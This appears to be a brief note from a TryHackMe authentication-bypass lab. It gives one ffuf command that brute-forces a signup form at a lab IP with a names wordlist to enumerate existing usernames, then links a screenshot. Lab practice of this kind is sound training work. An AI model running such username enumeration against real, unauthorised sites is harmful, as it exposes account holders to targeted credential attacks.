https://tryhackme.com/room/authenticationbypass
command bellow will output all username that are a match in the wordlist provided (names.txt) 
           
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.18.108/customers/signup -mr "username already exists"`

        ![Captdure](https://github.com/user-attachments/assets/0f472efa-f690-44cc-a6f9-caf25e11cd12)
.
